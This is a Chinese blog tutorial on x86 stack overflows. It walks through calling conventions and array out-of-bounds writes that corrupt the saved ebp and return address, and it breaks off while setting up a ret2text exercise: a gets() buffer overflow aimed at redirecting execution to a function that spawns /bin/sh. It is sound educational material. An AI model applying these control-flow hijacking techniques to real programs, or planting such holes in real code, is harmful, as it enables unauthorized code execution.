class="menu"><li class="item title"><a href="/" rel="start">Another Gensokyo</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva2.sinaimg.cn/large/8f9c6cc1ly8h18bslaqqij20t00kotf1.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/8f9c6cc1ly8h18b0h4heuj20qg0xs15i.jpg"></li><li class="item" data-background-image="https://tva2.sinaimg.cn/large/8f9c6cc1ly8h18cfl5ihmj21hc0u0ais.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/9bd9b167gy1fwsihw1c64j21hc0u0x6q.jpg"></li><li class="item" data-background-image="https://tva2.sinaimg.cn/large/8f9c6cc1ly8h18bgj8tg9j21590nstbw.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/8f9c6cc1ly8h18c6r31tcj216d0u0qd2.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">Home</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="item" rel="index" title="In 二进制"><span itemprop="name">二进制</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh"><link itemprop="mainEntityOfPage" href="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.png"><meta itemprop="name" content="symlPigeon"><meta itemprop="description" content="symlpigeon 的个人小站, 计算机、数学、人生还有碎碎念，网络中的一片个人保留地。"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="symlpigeon's little gensokyo"></span><div class="body md" itemprop="articleBody"><p><em>栈溢出应该算是一个十分基础的东西了，之前自己学过，然后过了一阵子就忘了……这次争取别忘掉。</em></p><h1 id="栈怎么就溢出了">栈怎么就溢出了</h1><p>我们在数据结构中所学的栈是一种特殊的数据结构，它满足先进后出，后进先出的特性。</p><p>在Linux下，一个程序的地址空间实际上是这样的形态（当然我们并不需要去考虑操作系统层面和硬件层面的虚拟内存等问题）：</p><p><img data-src="mem_org.jpg"></p><p>其中有两段，即stack和heap，是可以动态变化的。stack对应了我们所说的栈，而heap对应了我们所说的堆。</p><p>从图像中也可以看出来，栈的增长是从高地址到低地址的——也就是说，栈底出于高地址的位置，而栈顶处在低地址的位置。x86寄存器中的栈指针即esp，就指明了栈顶的位置，而栈基指针ebp则指明了栈底的位置。</p><p>一般来说，在函数中定义的局部变量等，都会被定义在栈上，而通过<code>malloc</code>分配的变量对应的空间则是在堆上。</p><div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> test<span class="op">()&#123;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> a<span class="op">[</span><span class="dv">100</span><span class="op">];</span> <span class="co">// 在栈上</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>b <span class="op">=</span> malloc<span class="op">(</span><span class="dv">100</span> <span class="op">*</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">char</span><span class="op">));</span> <span class="co">// 在堆上</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div><h2 id="函数的调用还有返回发生了什么">函数的调用还有返回发生了什么</h2><p>每当我们去调用一个函数的时候，我们都需要遵循一定的规则，这个规则也就是调用惯例。<a href="/2022/02/15/re-call/">之前</a>专门详细分析了几种调用惯例，这里不多说了，直接就拿最简单的来说。</p><div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> inc<span class="op">(</span><span class="dt">int</span> a<span class="op">)&#123;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> b <span class="op">=</span> a <span class="op">+</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> b<span class="op">;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()&#123;</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> a <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>    a <span class="op">=</span> inc<span class="op">(</span>a<span class="op">);</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;%d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> a<span class="op">);</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div><p>在这段程序中，在调用函数<code>inc(a)</code>之前，<code>main()</code>函数做了这样的事情：</p><pre class="x86asm"><code>11b2:       c7 45 f4 01 00 00 00    mov    DWORD PTR [ebp-0xc],0x1
+            ; 将变量a赋值为1（这一步实际上并不属于函数调用的部分）
+
+11b9:       ff 75 f4                push   DWORD PTR [ebp-0xc]
+            ; 将参数压栈（CDECL调用）
+11bc:       e8 cc ff ff ff          call   118d &lt;inc&gt;
+            ; 调用函数inc
+11c1:       83 c4 04                add    esp,0x4
+            ; 函数返回之后清理栈（栈顶加4就相当于把前面push DWORD PTR [ebp-0xc]这句占据的空间顶回来）</code></pre><p>在x86中，<code>call addr</code>这条指令做的是这样的事情：将当前指令的下一条指令（上文中的add esp,0x4这句指令）地址压入栈中，并掉转到<code>addr</code>对应的地址。</p><p>执行完了上面的指令之后，程序就会跳转进入<code>inc()</code>函数中。我们来看这个函数的指令：</p><pre class="x86asm"><code>        ; 下面的两条指令也就是所谓的函数序言
+118d:       55                      push   ebp
+        ; 将现在的ebp（实际上也就是之前main函数的栈基址）压入栈中
+118e:       89 e5                   mov    ebp,esp
+        ; 将ebp设定为esp，也就是现在的栈顶就是现在的栈基址
+
+1190:       83 ec 10                sub    esp,0x10
+        ; 开辟现在inc函数的栈空间（实际上多开了一部分空间）</code></pre><p>在执行完了这些部分之后，函数的堆栈实际上是这个样子的：</p><p><img data-src="stack_of_inc.jpg"></p><p>接下来的几条指令负责计算函数的结果：</p><pre class="x86asm"><code>1193:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
+    ; 从栈上获取参数
+1196:       83 c0 01                add    eax,0x1
+1199:       89 45 fc                mov    DWORD PTR [ebp-0x4],eax
+    ; 实际上DWORD PTR [ebp-0x4]这个位置就对应了函数inc中的局部变量b
+119c:       8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]</code></pre><p>接下来的部分就是函数最后的一些操作：</p><pre class="x86asm"><code>119f:       c9                      leave  
+11a0:       c3                      ret   </code></pre><p><code>leave</code>指令等价于<code>mov esp, ebp</code>并<code>pop ebp</code>。这条指令的作用在于清楚函数的栈，执行完之后，函数的栈是现在这样的情况：</p><p><img data-src="stack_of_inc_after_leave.jpg"></p><p>注意现在栈顶上的值是函数的返回地址——也就是说，下一步执行<code>ret</code>语句之后，程序就会跳转到这个返回地址（当然同时会把栈顶的元素弹出）。</p><p>接下来main函数会执行一部分的清栈工作等等（实际上对于stdcall和fastcall又是不一样的情况）。</p><h2 id="如果栈塞不下了">如果栈塞不下了……</h2><p>上面的例子中，函数里的局部变量是一个4字节的int类型。一个问题在于，如果函数里面有一个数组，那么在内存中是怎么样的布局？</p><div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> test<span class="op">()&#123;</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> a<span class="op">[</span><span class="dv">5</span><span class="op">]</span> <span class="op">=</span> <span class="op">&#123;</span><span class="dv">1</span><span class="op">,</span> <span class="dv">2</span><span class="op">,</span> <span class="dv">3</span><span class="op">,</span> <span class="dv">4</span><span class="op">,</span> <span class="dv">5</span><span class="op">&#125;;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div><p>我们来测试一下：</p><pre><code>pwndbg&gt; stack 16
+00:0000│ esp 0xffffd530 —▸ 0xf7fbd3e0 —▸ 0xf7d4a000 ◂— 0x464c457f
+01:0004│     0xffffd534 ◂— 0x0
+02:0008│     0xffffd538 ◂— 0xbfebfbff
+03:000c│     0xffffd53c ◂— 0x1
+04:0010│     0xffffd540 ◂— 0x2
+05:0014│     0xffffd544 ◂— 0x3
+06:0018│     0xffffd548 ◂— 0x4
+07:001c│     0xffffd54c ◂— 0x5
+08:0020│ ebp 0xffffd550 —▸ 0xffffd558 —▸ 0xf7ffcb80 (_rtld_local_ro) ◂— 0x0
+09:0024│     0xffffd554 —▸ 0x565561b1 (main+8) ◂— mov    eax, 0</code></pre><p>可以看出来，栈上面的这个数组增长的顺序是和栈的增长方向是反过来的——数组中前面的元素在靠近栈顶的地方，后面的元素在靠近栈底的地方。</p><p>这样一个问题就来了，如果这个局部变量占了实际上超过了我们给它大小的空间会发生什么事情？</p><p>我们可以试一下。</p><div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> bad_test<span class="op">()&#123;</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> a<span class="op">[</span><span class="dv">5</span><span class="op">]</span> <span class="op">=</span> <span class="op">&#123;</span><span class="dv">1</span><span class="op">,</span> <span class="dv">2</span><span class="op">,</span> <span class="dv">3</span><span class="op">,</span> <span class="dv">4</span><span class="op">,</span> <span class="dv">5</span><span class="op">&#125;;</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>    a<span class="op">[</span><span class="dv">5</span><span class="op">]</span> <span class="op">=</span> <span class="dv">6</span><span class="op">;</span> <span class="co">// 实际上这就是一个常见的数组越界访问的问题。</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()&#123;</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> a <span class="op">=</span> <span class="dv">100</span><span class="op">;</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>    bad_test<span class="op">();</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;%d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> a<span class="op">);</span></span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div><p>运行一下，然后：</p><pre><code>Job 1, &#39;./a.out&#39; terminated by signal SIGSEGV (Address boundary error)</code></pre><p>SIGSEGV是段错误。 我们可以追踪一下哪里出了问题。</p><p><img data-src="bad_test_asm1.jpg"></p><p>从gdb的调试中我们可以看到，<code>a[5] = 6;</code>这句话对应了<code>mov dword ptr [ebp], 6</code>这条指令。这条指令显然覆盖了<code>EBP</code>位置上面的值，这个值如果看上面的图的话，应该就能够发现这个地址上就是<code>main</code>函数的基址。</p><p>在<code>leave</code>指令之后，<code>main</code>函数的<code>ebp</code>的值是0x2。</p><p>我们把程序调试到那个位置上：</p><p><img data-src="bad_test_asm2.jpg"></p><p>下一步是<code>push dword ptr [ebp - 0xc]</code>，可是<code>EBP</code>的值是0x6！</p><p>很明显：</p><pre><code>Program received signal SIGSEGV, Segmentation fault.</code></pre><p>段错误。在<code>main</code>函数试图访问某个地址的时候出现了问题——<code>main</code>函数并不知道自己的<code>ebp</code>已经被修改了，它仍在试图去访问基于<code>ebp</code>偏移的栈上的变量——而这个内存地址现在是不合法的了。</p><p>前面是修改了栈基址，如果我们能够更进一步去修改返回地址呢？</p><div class="sourceCode" id="cb12"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> bad_test<span class="op">()&#123;</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> a<span class="op">[</span><span class="dv">5</span><span class="op">]</span> <span class="op">=</span> <span class="op">&#123;</span><span class="dv">1</span><span class="op">,</span> <span class="dv">2</span><span class="op">,</span> <span class="dv">3</span><span class="op">,</span> <span class="dv">4</span><span class="op">,</span> <span class="dv">5</span><span class="op">&#125;;</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>    a<span class="op">[</span><span class="dv">5</span><span class="op">]</span> <span class="op">=</span> <span class="dv">6</span><span class="op">;</span> <span class="co">// 实际上这就是一个常见的数组越界访问的问题。</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>    a<span class="op">[</span><span class="dv">6</span><span class="op">]</span> <span class="op">=</span> <span class="dv">7</span><span class="op">;</span> <span class="co">// 更过分了（</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()&#123;</span></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> a <span class="op">=</span> <span class="dv">100</span><span class="op">;</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>    bad_test<span class="op">();</span></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;%d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> a<span class="op">);</span></span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div><p>根据上面的情况，我们可以猜到当函数执行<code>ret</code>的时候，会返回到一个错误的地址。</p><p><img data-src="bad_test_stack.jpg"></p><p>在执行完函数中的赋值操作之后，程序的栈是这个样子。接下来在返回时，整个程序的栈更是惨不忍睹：</p><p><img data-src="bad_test_corrupt_stack.jpg"></p><p>下面一步<code>ret</code>到的地方自然是无效的地址，程序在这之后就会崩溃。</p><p>这个也就是所谓的“栈溢出”。</p><h1 id="能不能利用">能不能利用</h1><h2 id="控制流是不是出问题了">控制流是不是出问题了？</h2><p><code>ret</code>指令会返回到现在栈顶上存放的地址。那么如果我们任意修改这个位置上的值，理论上也就能够让程序跳转到任意一个地方了。</p><p>前面程序出现了SIGSEGV是因为执行的地址无效，我们现在需要的是填一个有效的地址进去：</p><div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> impossible<span class="op">()&#123;</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;you can&#39;t see me!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> bad_test<span class="op">()&#123;</span></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> a<span class="op">[</span><span class="dv">5</span><span class="op">]</span> <span class="op">=</span> <span class="op">&#123;</span><span class="dv">1</span><span class="op">,</span> <span class="dv">2</span><span class="op">,</span> <span class="dv">3</span><span class="op">,</span> <span class="dv">4</span><span class="op">,</span> <span class="dv">5</span><span class="op">&#125;;</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>    a<span class="op">[</span><span class="dv">6</span><span class="op">]</span> <span class="op">=</span> <span class="op">&amp;</span>impossible<span class="op">;</span></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()&#123;</span></span>
+<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a>    bad_test<span class="op">();</span></span>
+<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div><p>在运行之后，我们可以看到程序输出了：</p><pre><code>$ ./a.out
+you can&#39;t see me!
+fish: Job 1, &#39;./a.out&#39; terminated by signal SIGSEGV (Address boundary error)</code></pre><p>很明显，<code>impossible</code>这个从来没被调用的函数被执行了。在执行完函数<code>bad_test</code>后，程序尝试返回到<code>main</code>函数。但是这个时候<code>main</code>函数的返回地址已经被替换成了<code>impossible</code>函数的地址——程序就会转而去执行这个<code>impossible</code>函数。</p><p>这也就是说明了程序为什么会执行<code>impossible</code>函数。</p><p>再进一步看，我们的程序是通过<code>ret</code>指令进入到<code>impossible</code>函数中的，和正常的函数调用并不一样——这时候并没有一个<code>call impossible</code>指令去把执行完之后的返回地址压入栈中。也就是说，程序执行完<code>impossible</code>之后，它就不知道该返回哪里了。本来在执行<code>impossible</code>函数的<code>ret</code>指令时，栈顶应该是调用方压好的返回地址，但是没人去做这件事，栈顶现在是先前某个函数执行过程中留下的痕迹。</p><p>然后，程序就会跳转到这个不知道哪里的地方，接着程序就会崩溃。</p><p>实际上我们可以做一些更有趣的事情：</p><div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> impossible<span class="op">()&#123;</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;you can&#39;t see me!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> impossible_too<span class="op">()&#123;</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;you can&#39;t see me too!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> impossible_too_too<span class="op">()&#123;</span></span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;you can&#39;t see me too, too!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> bad_test<span class="op">()&#123;</span></span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> a<span class="op">[</span><span class="dv">5</span><span class="op">]</span> <span class="op">=</span> <span class="op">&#123;</span><span class="dv">1</span><span class="op">,</span> <span class="dv">2</span><span class="op">,</span> <span class="dv">3</span><span class="op">,</span> <span class="dv">4</span><span class="op">,</span> <span class="dv">5</span><span class="op">&#125;;</span></span>
+<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>    a<span class="op">[</span><span class="dv">6</span><span class="op">]</span> <span class="op">=</span> <span class="op">&amp;</span>impossible<span class="op">;</span></span>
+<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>    a<span class="op">[</span><span class="dv">7</span><span class="op">]</span> <span class="op">=</span> <span class="op">&amp;</span>impossible_too<span class="op">;</span></span>
+<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a>    a<span class="op">[</span><span class="dv">8</span><span class="op">]</span> <span class="op">=</span> <span class="op">&amp;</span>impossible_too_too<span class="op">;</span></span>
+<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span>
+<span id="cb15-21"><a href="#cb15-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-22"><a href="#cb15-22" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()&#123;</span></span>
+<span id="cb15-23"><a href="#cb15-23" aria-hidden="true" tabindex="-1"></a>    bad_test<span class="op">();</span></span>
+<span id="cb15-24"><a href="#cb15-24" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb15-25"><a href="#cb15-25" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div><p>一个程序的栈中被溢出了多个地址，这是它输出发生的变化：</p><pre><code>$ ./a.out
+you can&#39;t see me!
+you can&#39;t see me too!
+you can&#39;t see me too, too!
+fish: Job 1, &#39;./a.out&#39; terminated by signal SIGSEGV (Address boundary error)</code></pre><p>这张图可以来说明发生了什么——我们往地址中有意填充了一系列函数的返回地址，程序也就会顺着我们填充的地址来进行跳转。</p><p><img data-src="stack_corrupt_chains.jpg"></p><p>这样子，我们构造了一条控制流来影响程序的运行。</p><h2 id="如果有输入的话然后ret2text">如果有输入的话，然后ret2text</h2><p>这样的话，如果这个程序有输入……</p><div class="sourceCode" id="cb17"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> impossible<span class="op">()&#123;</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>    execve<span class="op">(</span><span class="st">&quot;/bin/sh&quot;</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">0</span><span class="op">);</span> <span class="co">// get shell</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> bad_test<span class="op">()&#123;</span></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> input<span class="op">[</span><span class="dv">16</span><span class="op">];</span></span>
+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>    gets<span class="op">(</span>input<span class="op">);</span></span>
+<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span>
+<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()&#123;</span></span>
+<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a>    bad_test<span class="op">();</span></span>
+<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div><p><code>gets</code>函数的一个特点在于，它不会检查读入了多少字符。也就是说，尽管<code>input</code>只能放下16个char，gets也不会在输入了16个字符的时候停下来。</p><p>那这样，多余的输入就会冲入栈上的剩余空间。</p><p><img data-src="gets_stack_overflow.jpg"></p><p>如果我们去有意构造程序的输入，那我们也就能够去控制程序的运行。通过反编译工具，我们能够看到函数<code>impossible</code>的地址：</p><pre class="x86asm"><code>08049186 &lt;impossible&gt;:
+ 8049186:       55                      push   ebp
+ 8049187:       89 e5                   mov    ebp,esp
+ ......</code></pre><p>我们就需要想法设法将<code>0x08049186</code>这个地址覆盖到<code>bad_test</code>函数的返回地址。来看这个函数的指令：</p><pre class="x86asm"><code>080491a3 &lt;bad_test&gt;:
+ 80491a3:       55                      push   ebp
+ 80491a4:       89 e5                   mov    ebp,esp
+ 80491a6:       83 ec 18                sub    esp,0x18
+ 80491a9:       83 ec 0c                sub    esp,0xc
+ 80491ac:       8d 45 e8                lea    eax,[ebp-0x18]
+ 80491af:       50                      push   eax
+ 80491b0:       e8 9b fe ff ff          call   8049050 &lt;gets@plt&gt;
+ 80491b5:       83 c4 10                add    esp,0x10
+ 80491b8:       90                      nop
+ 80491b9:       c9                      leave  
